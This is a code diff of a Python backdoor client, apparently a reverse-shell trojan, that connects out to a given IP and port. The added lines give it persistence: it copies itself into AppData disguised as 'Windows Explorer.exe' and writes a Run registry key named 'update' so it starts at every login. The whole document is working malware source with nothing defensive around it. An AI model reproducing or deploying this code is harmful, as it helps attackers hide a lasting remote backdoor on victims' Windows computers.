@@ -1,11 +1,18 @@
 #!/usr/bin/env python
 
-import socket, subprocess, json, os, base64, sys
+import socket, subprocess, json, os, base64, sys, shutil
 
 class Connector:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    def become_persistent(self):
+        evil_file_location = os.path.join(os.environ["appdata"], "Microsoft", "Windows", "Windows Explorer.exe")
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
     def reliable_send(self, data):
         while True:
